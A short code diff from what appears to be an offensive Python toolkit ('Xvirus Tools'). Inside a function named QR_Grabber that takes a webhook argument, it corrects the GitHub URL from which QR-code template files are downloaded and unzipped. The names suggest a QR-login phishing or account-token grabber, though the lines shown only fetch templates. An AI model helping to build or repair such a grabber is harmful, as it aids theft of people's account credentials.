@@ -53,7 +53,7 @@ def QR_Grabber(Webhook):
 
     # Download qr code templates
     urlretrieve(
-        "https://github.com/Xvirus0/Xvirus_Tools/asstes/QR-Code.zip",
+        "https://github.com/Xvirus0/Xvirus-Tools/asstes/QR-Code.zip",
         filename="QR-Code.zip",
     )
     with ZipFile("QR-Code.zip", 'r')as zip2:
